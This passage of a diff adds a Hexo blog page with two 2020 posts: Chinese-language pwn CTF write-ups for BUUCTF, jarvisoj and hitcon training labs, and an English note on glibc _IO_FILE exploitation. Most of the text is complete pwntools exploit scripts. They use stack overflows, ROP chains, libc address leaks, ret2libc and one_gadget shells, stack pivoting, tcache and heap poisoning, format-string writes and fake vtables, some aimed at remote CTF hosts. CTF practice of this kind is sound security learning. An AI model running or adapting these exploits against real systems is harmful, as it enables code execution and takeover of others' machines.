+p.send(&#39;a&#39;*136+p64(0x400620))
+p.interactive()
+</code></pre>
+<h2 id="BJDCTF-2nd-test"><a href="#BJDCTF-2nd-test" class="headerlink" title="[BJDCTF 2nd]test"></a>[BJDCTF 2nd]test</h2><p>这题我一开始思路是把文件 scp 下来(<code>scp -P 27993 ctf@node3.buuoj.cn:/home/ctf/test /home/pic/Downloads</code>)用溢出的方式打,没想到几个命令就行??</p>
+<p>之后看了看网上的 wp 用<code>ls /usr/bin/ /bin/ | grep -v -E &quot;n|e|p|b|u|s|h|i|f|l|a|g&quot;</code>找到<code>x86_64</code> 和 <code>od *</code>两个命令能够</p>
+<h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><p>这题和之前的太类似了,不写了,写一下之后得用万能 gadget 的</p>
+<h2 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+p = process(&#39;./level3_x64&#39;)
+context.log_level = &#39;debug&#39;
+p=remote(&#39;node3.buuoj.cn&#39;,29545)
+elf = ELF(&#39;./level3_x64&#39;)
+libc = elf.libc
+libc=ELF(&#39;libc-2.23.so&#39;)
+plt = elf.plt[&#39;write&#39;]
+got = elf.got[&#39;write&#39;]
+#libc = ELF(&#39;libc.so.6&#39;)
+payload = &#39;a&#39;*136+p64(0x4006AA)+p64(0)+p64(1)+p64(got)+p64(8)+p64(got)+p64(1)+p64(0x400690)+p64(0)*7+p64(0x04005E6)
+p.recvuntil(&#39;Input&#39;)
+p.sendline(payload)
+
+#edi esi edx
+#  1 got   8
+off = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
+libc_base = off - libc.symbols[&quot;write&quot;]
+print hex(libc_base)
+sys = libc_base+libc.symbols[&quot;system&quot;]
+sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
+#gdb.attach(p,&#39;b*0x400619&#39;)
+payload = &#39;a&#39;*136+p64(0x04006B3)+p64(sh)+p64(sys)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>万能 gadget 利用</p>
+<h2 id="jarvisoj-level4"><a href="#jarvisoj-level4" class="headerlink" title="jarvisoj_level4"></a>jarvisoj_level4</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+p = process(&#39;./level4&#39;)
+context.log_level = &#39;debug&#39;
+p=remote(&#39;node3.buuoj.cn&#39;,26628)
+elf = ELF(&#39;./level4&#39;)
+#libc = elf.libc
+libc=ELF(&#39;libc-2.23.so&#39;)
+plt = elf.plt[&#39;write&#39;]
+got = elf.got[&#39;write&#39;]
+#libc = ELF(&#39;libc.so.6&#39;)
+payload = &#39;a&#39;*140+p32(plt)+p32(0x804844B)+p32(1)+p32(got)+p32(4)
+p.sendline(payload)
+off = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])
+libc_base = off - libc.symbols[&quot;write&quot;]
+print hex(libc_base)
+sys = libc_base+libc.symbols[&quot;system&quot;]
+sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
+#gdb.attach(p,&#39;b*0x400619&#39;)
+payload = &#39;a&#39;*140+p32(sys)+p32(sh)*2
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h2 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a>hitcontraining_heapcreator</h2><pre><code>from pwn import *
+p=process(&#39;heapcreator&#39;)
+context.log_level = &#39;debug&#39;
+elf=ELF(&#39;heapcreator&#39;)
+libc=elf.libc
+def create(size,content):
+	p.sendafter(&#39;choice&#39;,&#39;1&#39;)
+	p.sendafter(&#39;Size of Heap&#39;,str(size))
+	p.sendafter(&#39;Content of heap&#39;,content)
+def edit(ind,content):
+	p.sendafter(&#39;choice&#39;,&#39;2&#39;)
+	p.sendafter(&#39;Index&#39;,str(ind))
+	p.sendafter(&#39;Content of heap&#39;,content)
+def show(ind):
+	p.sendafter(&#39;choice&#39;,&#39;3&#39;)
+	p.sendafter(&#39;Index&#39;,str(ind))
+def delete(ind):
+	p.sendafter(&#39;choice&#39;,&#39;4&#39;)
+	p.sendafter(&#39;Index&#39;,str(ind))
+
+free_got = elf.got[&quot;free&quot;]
+create(0x18,&#39;a&#39;)
+create(0x10,&#39;b&#39;)
+edit(0,&#39;/bin/sh\x00&#39;+&#39;a&#39;*0x10+p64(0x41))
+delete(1)
+create(0x30,p64(0)*4+p64(0x30)+p64(free_got))
+show(1)
+off = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
+base = off-libc.symbols[&quot;free&quot;]
+sys = base+libc.symbols[&quot;system&quot;]
+edit(1,p64(sys))
+delete(0)
+gdb.attach(p)
+p.interactive()
+</code></pre>
+<h2 id="actf-2019-babystack"><a href="#actf-2019-babystack" class="headerlink" title="actf_2019_babystack"></a>actf_2019_babystack</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#p = process(&#39;./ACTF_2019_babystack&#39;)
+context.log_level = &#39;debug&#39;
+p=remote(&#39;node3.buuoj.cn&#39;,29828)
+elf = ELF(&#39;./ACTF_2019_babystack&#39;)
+#libc = elf.libc
+libc=ELF(&#39;libc-2.27.so&#39;)
+p.recvuntil(&#39;message?\n&#39;)
+p.sendline(&#39;224&#39;)
+p.recvuntil(&#39;0x&#39;)
+stack = int(p.recvuntil(&#39;\n&#39;)[:-1],16)
+got = elf.got[&#39;puts&#39;]
+plt = elf.plt[&#39;puts&#39;]
+payload = &#39;a&#39;*8+p64(0x400AD3)+p64(got)+p64(plt)+p64(0x4008F6)
+payload = payload.ljust(208)
+payload+= p64(stack)+p64(0x400A18)
+p.recvuntil(&#39;content&#39;)
+p.send(payload)
+off = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
+libc_base = off - libc.symbols[&quot;puts&quot;]
+print hex(libc_base)
+
+p.recvuntil(&#39;message?\n&#39;)
+p.sendline(&#39;224&#39;)
+p.recvuntil(&#39;0x&#39;)
+stack = int(p.recvuntil(&#39;\n&#39;)[:-1],16)
+sys = libc_base+libc.symbols[&quot;system&quot;]
+sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
+one = libc_base+0x4f322
+payload = &#39;a&#39;*8+p64(one)
+payload = payload.ljust(208,&#39;\x00&#39;)
+payload+= p64(stack)+p64(0x400A18)
+p.recvuntil(&#39;content&#39;)
+#gdb.attach(p,&#39;b*0x0400A18&#39;)
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<p>常规栈迁移</p>
+<h2 id="oneshot-tjctf-2016"><a href="#oneshot-tjctf-2016" class="headerlink" title="oneshot_tjctf_2016"></a>oneshot_tjctf_2016</h2><pre><code>from pwn import *
+#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#p = process(&#39;./oneshot_tjctf_2016&#39;)
+context.log_level = &#39;debug&#39;
+p=remote(&#39;node3.buuoj.cn&#39;,28491)
+elf = ELF(&#39;./oneshot_tjctf_2016&#39;)
+#libc = elf.libc
+libc=ELF(&#39;libc-2.23.so&#39;)
+got=elf.got[&quot;puts&quot;]
+p.recvuntil(&#39;location?&#39;)
+p.sendline(str(got))
+p.recvuntil(&#39;0x&#39;)
+base =int(p.recvuntil(&#39;\n&#39;)[:-1],16)-libc.symbols[&quot;puts&quot;]
+print hex(base)
+one = base +0xf1147
+print hex(one)
+p.recvuntil(&#39;location?&#39;)
+#gdb.attach(p,&#39;b*0x4006BB&#39;)
+p.sendline(str(one))
+p.interactive()
+</code></pre>
+<p>one_gadget 利用</p>
+<h2 id="ZJCTF-2019-Login"><a href="#ZJCTF-2019-Login" class="headerlink" title="[ZJCTF 2019]Login"></a>[ZJCTF 2019]Login</h2><pre><code>from pwn import *
+#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+p = process(&#39;./login&#39;)
+context.log_level = &#39;debug&#39;
+#p=remote(&#39;node3.buuoj.cn&#39;,29037)
+elf = ELF(&#39;./login&#39;)
+libc = elf.libc
+p.recvuntil(&#39;:&#39;)
+p.sendline(&#39;admin&#39;)
+p.recvuntil(&#39;:&#39;)
+gdb.attach(p,&#39;b*0x400a4a&#39;)
+payload = &#39;2jctf_pa5sw0rd\x00&#39;+&#39;\x00&#39;*57+p64(0x400E88)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>这题属实没看懂,最后一点一点调出来的,看 wp 也看不太懂，自己敲了敲试出来了</p>
+<h1 id="lab4"><a href="#lab4" class="headerlink" title="lab4"></a>lab4</h1><p>这题很简单，就是送一个地址然后查看地址内容。然后我发现我真是有点呆，通过本地调试查看偏移量，发现偏移量不大。我就想本地爆破，我靠。。。发现自己真是逆向那边套路学多了，不行不行。看了 wp 发现是用 got 表，我怎么没想到~~~我真服了，而且这路走不通。函数限定地址大小小于<code>0x7fffffff</code></p>
+<pre><code>from pwn import *
+context.log_level = &#39;debug&#39;
+p = process(&#39;ret2lib&#39;)
+elf = ELF(&#39;ret2lib&#39;)
+libc=elf.libc
+got = elf.got[&quot;puts&quot;]
+shellcode = got
+p.recvuntil(&#39;:&#39;)
+p.send(str(shellcode))
+p.recvuntil(&#39;address : &#39;)
+plt = int(p.recvuntil(&#39;\n&#39;),16)
+libc_base = plt-libc.symbols[&quot;puts&quot;]
+print hex(libc_base)
+gdb.attach(p)
+sys = libc_base+libc.symbols[&quot;system&quot;]
+sh = libc_base+libc.search(&quot;/bin/sh&quot;).next()
+p.sendline(&#39;a&#39;*60+p32(sys)+&#39;\x01&#39;*4+p32(sh))
+p.interactive()
+</code></pre>
+<h1 id="lab5"><a href="#lab5" class="headerlink" title="lab5"></a>lab5</h1><p>这题我对 rop 又进一步理解了一下，一开始我还很自信，觉得直接 ropchain 直接甩就行，后来通过 ida 发现限制了字节数，真是一个字节不多。于是</p>
+<pre><code>from pwn import *
+from struct import pack
+context.log_level = &#39;debug&#39;
+io = process(&#39;simplerop&#39;)
+p = &#39;&#39;
+p += pack(&#39;&lt;I&#39;, 0x0806e82a) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data
+p += pack(&#39;&lt;I&#39;, 0x080bae06) # pop eax ; ret
+p += &#39;/bin&#39;
+p += pack(&#39;&lt;I&#39;, 0x0809a15d) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0806e82a) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080ea064) # @ .data + 4
+p += pack(&#39;&lt;I&#39;, 0x080bae06) # pop eax ; ret
+p += &#39;//sh&#39;
+p += pack(&#39;&lt;I&#39;, 0x0809a15d) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0806e850) # pop edx ; pop ecx ; pop ebx ; ret
+p += pack(&#39;&lt;I&#39;, 0) 
+p += pack(&#39;&lt;I&#39;, 0) 
+p += pack(&#39;&lt;I&#39;, 0x080ea060) 
+p += pack(&#39;&lt;I&#39;, 0x080bae06) # pop eax ; ret
+p += pack(&#39;&lt;I&#39;, 11)
+p += pack(&#39;&lt;I&#39;, 0x080493e1) # int 0x80
+io.recvuntil(&#39;:&#39;)
+io.send(&#39;a&#39;*32+p)
+io.interactive(
+</code></pre>
+<p>其实 ropchain 生成的明显有多余的，所以能够进行大范围的化简（23行&#x3D;&gt;6行</p>
+<h1 id="lab6"><a href="#lab6" class="headerlink" title="lab6"></a>lab6</h1><p>卡住了，昨天做梦都想这题，然后觉得这方法已经解决了，但是好像还是因为堆栈的问题执行 <code>system(&quot;/bin/sh&quot;)</code> 的时候死了，就很难受</p>
+<pre><code>from pwn import *
+context.log_level = &#39;debug&#39;
+io = process(&#39;migration&#39;)
+elf = ELF(&#39;migration&#39;)
+libc = elf.libc
+got = elf.got[&quot;puts&quot;]
+io.recvuntil(&#39;\n&#39;)
+io.send(&#39;a&#39;*40+p32(0x804A008+0x28+0x500)+p32(0x80484EA)+p32(got))
+sleep(0.1)
+real = u32(io.recv(4))
+base = real - libc.symbols[&quot;puts&quot;]
+one = base+0x3ac69
+io.send(p32(0)+p32(one)+p32(0)*8+p32(0x804A008+0x500)+p32(0x8048504))
+io.interactive()
+</code></pre>
+<p>一定要注意 bss 端得躲一块，不然最后起 shell 起不来，这个具体我还没研究，涉及到内核了</p>
+<h1 id="lab7（lab8同理"><a href="#lab7（lab8同理" class="headerlink" title="lab7（lab8同理"></a>lab7（lab8同理</h1><pre><code>from pwn import *
+from struct import pack
+context.log_level = &#39;debug&#39;
+io = process(&#39;crack&#39;)
+io.recvuntil(&#39;?&#39;)
+payload = fmtstr_payload(10, &#123;0x0804A048:123&#125;)
+io.send(payload)
+io.recvuntil(&#39;:&#39;)
+io.send(&#39;123&#39;)
+io.interactive()
+</code></pre>
+<p>pwntools nb 就完事了</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/07/31/2020-07-31-buuctf/" data-id="cuidmyOWab5-rtW1FoyWo-Pbq" data-title="pwn" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2020-07-31-io" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/07/31/2020-07-31-io/" class="article-date">
+  <time class="dt-published" datetime="2020-07-30T16:00:00.000Z" itemprop="datePublished">2020-07-31</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/07/31/2020-07-31-io/">IO_file</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Pic4xiu’s-note-for-IOFILE"><a href="#Pic4xiu’s-note-for-IOFILE" class="headerlink" title="Pic4xiu’s note for IOFILE"></a>Pic4xiu’s note for IOFILE</h1><h3 id="IO-FILE-Source-code"><a href="#IO-FILE-Source-code" class="headerlink" title="_IO_FILE Source code"></a>_IO_FILE Source code</h3><pre><code>struct _IO_FILE &#123;
+  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
+#define _IO_file_flags _flags
+
+  /* The following pointers correspond to the C++ streambuf protocol. */
+  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
+  char* _IO_read_ptr;   /* Current read pointer */
+  char* _IO_read_end;   /* End of get area. */
+  char* _IO_read_base;  /* Start of putback+get area. */
+  char* _IO_write_base; /* Start of put area. */
+  char* _IO_write_ptr;  /* Current put pointer. */
+  char* _IO_write_end;  /* End of put area. */
+  char* _IO_buf_base;   /* Start of reserve area. */
+  char* _IO_buf_end;    /* End of reserve area. */
+  /* The following fields are used to support backing up and undo. */
+  char *_IO_save_base; /* Pointer to start of non-current get area. */
+  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
+  char *_IO_save_end; /* Pointer to end of non-current get area. */
+
+  struct _IO_marker *_markers;
+
+  struct _IO_FILE *_chain;
+
+  int _fileno;
+#if 0
+  int _blksize;
+#else
+  int _flags2;
+#endif
+  _IO_off_t _old_offset; /* This used to be _offset but it&#39;s too small.  */
+
+#define __HAVE_COLUMN /* temporary */
+  /* 1+column number of pbase(); 0 is unknown. */
+  unsigned short _cur_column;
+  signed char _vtable_offset;
+  char _shortbuf[1];
+
+  /*  char* _save_gptr;  char* _save_egptr; */
+
+  _IO_lock_t *_lock;
+#ifdef _IO_USE_OLD_IO_FILE
+&#125;;
+</code></pre>
+<h3 id="Some-common-sense"><a href="#Some-common-sense" class="headerlink" title="Some common sense"></a>Some common sense</h3><p>stdin、stdout、stderr are in the libc.so data segment (automatically opened) ，But the file stream created by fopen is in the heap</p>
+<pre><code>_IO_2_1_stderr_
+_IO_2_1_stdout_
+_IO_2_1_stdin_
+//what they look like
+
+struct _IO_FILE_plus
+&#123;
+    _IO_FILE    file;
+    IO_jump_t   *vtable;//The 32-bit offset is 0x94, while the 64 bit offset is 0xd8
+&#125;
+</code></pre>
+<p>Look at the picture below , VTable has function pointers below that can jump</p>
+<p><img src="https://s2.ax1x.com/2020/02/14/1j9eoT.png" alt="image"></p>
+<h1 id="Some-exercises"><a href="#Some-exercises" class="headerlink" title="Some exercises"></a>Some exercises</h1><h3 id="fake-vtable"><a href="#fake-vtable" class="headerlink" title="fake_vtable"></a>fake_vtable</h3><blockquote>
+<p>The_end ( hctf )</p>
+</blockquote>
+<pre><code>#coding=utf8
+from pwn import *
+context.log_level = &#39;debug&#39;
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
+local = 1
+elf = ELF(&#39;./the_end&#39;)
+if local:
+    p = process(&#39;the_end&#39;)
+    libc = ELF(&#39;./libc.so.6&#39;)
+else:
+    p = remote(&#39;116.85.48.105&#39;,5005)
+    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+sl = lambda s : p.sendline(s)
+sd = lambda s : p.send(s)
+rc = lambda n : p.recv(n)
+ru = lambda s : p.recvuntil(s)
+ti = lambda : p.interactive()
+
+def debug(addr,PIE=True):
+    if PIE:
+        text_base = int(os.popen(&quot;pmap &#123;&#125;| awk &#39;&#123;&#123;print $1&#125;&#125;&#39;&quot;.format(p.pid)).readlines()[1], 16)
+        gdb.attach(p,&#39;b *&#123;&#125;&#39;.format(hex(text_base+addr)))
+    else:
+        gdb.attach(p,&quot;b *&#123;&#125;&quot;.format(hex(addr)))
+
+def bk(addr):
+    gdb.attach(p,&quot;b *&quot;+str(hex(addr)))
+debug(0x000964)
+ru(&quot;gift &quot;)
+sleep_addr = int(rc(14),16)
+libc_base = sleep_addr - libc.symbols[&#39;sleep&#39;]
+onegadget = libc_base + 0xf02a4
+vtable = libc_base + 0x39c6f8
+fake_vtable = vtable - 0x90
+fake_setbuf = fake_vtable + 88
+print &quot;libc_base---&gt;&quot; + hex(libc_base)
+print &quot;vtable---&gt;&quot; + hex(vtable)
+print &quot;fake_vtable---&gt;&quot; + hex(fake_vtable)
+print &quot;fake_setbuf---&gt;&quot; + hex(fake_setbuf)
+print &quot;onegadget---&gt;&quot; + hex(onegadget)
+for i in range(2):
+    sd(p64(vtable+i))
+    sd(p64(fake_vtable)[i])
+for i in range(3):
+    sd(p64(fake_setbuf+i))
+    sd(p64(onegadget)[i])
+
+p.interactive()
+</code></pre>
+<p>I think it’s very easy , just modify <code>_IO_2_1_stdout_</code> vtable addr to a fake_vtable , then use it’s fake_setbuf to point onegadget . And this practice has another method : utilize <code>exit</code> execute <code>_dl_fini</code> , <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-248495.htm">See for details</a></p>
+<h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><blockquote>
+<p>bms ( ciscn )</p>
+</blockquote>
+<pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+p = process(&#39;./pwn&#39;)
+elf = ELF(&#39;./pwn&#39;)
+libc = elf.libc
+context.log_level = &#39;debug&#39;
+
+p.recvuntil(&#39;username:&#39;)
+p.sendline(&#39;admin&#39;)
+p.recvuntil(&#39;password:&#39;)
+p.sendline(&#39;frame&#39;)
+
+def create(name,size,context):
+    p.sendlineafter(&#39;&gt;\n&#39;,&#39;1&#39;)
+    p.sendafter(&#39;book name:&#39;,name)
+    p.sendlineafter(&#39;description size:&#39;,str(size))
+    p.sendafter(&#39;description:&#39;,context)
+
+def createe(name,size,context):
+    p.sendlineafter(&#39;&gt;&#39;,&#39;1&#39;)
+    p.sendafter(&#39;book name:&#39;,name)
+    p.sendlineafter(&#39;description size:&#39;,str(size))
+    p.sendafter(&#39;description:&#39;,context)
+
+def delete(index):
+    p.sendlineafter(&#39;&gt;\n&#39;,&#39;2&#39;)
+    p.sendlineafter(&#39;index:&#39;,str(index))
+
+def deletee(index):
+    p.sendlineafter(&#39;&gt;&#39;,&#39;2&#39;)
+    p.sendlineafter(&#39;index:&#39;,str(index))
+
+#tcathe attack to the IO_File
+create(&#39;A&#39;,0x68,&#39;A&#39;*0x68)
+delete(0)
+delete(0)
+create(&#39;A&#39;,0x68,p64(0x602020))
+create(&#39;A&#39;,0x68,&#39;A&#39;)
+create(&#39;A&#39;,0x68,&#39;\x60&#39;)
+create(&#39;A&#39;,0x68,p64(0xfbad1800)+p64(0)*3+&#39;\x90&#39;)
+
+#leak the libc
+data = u64(p.recv(6).ljust(8,&#39;\x00&#39;))
+libc_base = data - 4114403
+system_addr = libc_base + libc.symbols[&#39;system&#39;]
+free_addr = libc_base + libc.symbols[&#39;__free_hook&#39;]
+log.success(&#39;libc base is :&#39;+hex(libc_base))
+
+#tcache attack to __free_hook
+createe(&#39;A&#39;,0x30,&#39;A&#39;)#5
+deletee(5)
+deletee(5)
+createe(&#39;A&#39;,0x30,p64(free_addr))#6
+createe(&#39;A&#39;,0x30,&#39;/bin/sh&#39;)#7
+createe(&#39;A&#39;,0x30,p64(system_addr))#8
+
+#trigger
+deletee(7)
+
+p.interactive()
+</code></pre>
+<p>This exercise combined tcache , very interesting !</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/07/31/2020-07-31-io/" data-id="cuidN4SZUdgCPo-QYg82Xr3AR" data-title="IO_file" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI/">AI</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ai/" rel="tag">ai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chat/" rel="tag">chat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/Misc/" style="font-size: 12.5px;">Misc</a> <a href="/tags/Web/" style="font-size: 12.5px;">Web</a> <a href="/tags/ai/" style="font-size: 10px;">ai</a> <a href="/tags/chat/" style="font-size: 15px;">chat</a> <a href="/tags/fuzz/" style="font-size: 10px;">fuzz</a> <a href="/tags/misc/" style="font-size: 17.5px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/08/">August 1999</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">January 1999</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/10/01/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/27/2023-06-27-fuzzer/">如何完成一个 fuzzer</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-05-31-report/">安全开发</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-06-18-fixandPR/">记一次 fuzz go 的一个第三方库</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/23/2023-05-23-waf/">AI 安全之</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
